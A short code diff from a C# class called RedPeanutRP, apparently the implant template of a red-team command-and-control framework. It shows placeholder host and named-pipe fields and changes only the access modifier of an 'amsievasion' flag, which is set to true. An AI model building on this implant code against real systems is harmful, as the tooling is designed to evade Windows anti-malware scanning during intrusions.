@@ -51,7 +51,7 @@ public class RedPeanutRP
         string host = "#HOST#";
 
         string namedpipe = "#PIPENAME#";
-        public bool amsievasion = true;
+        bool amsievasion = true;
 
         int port = 0;
         int targetframework = 40;
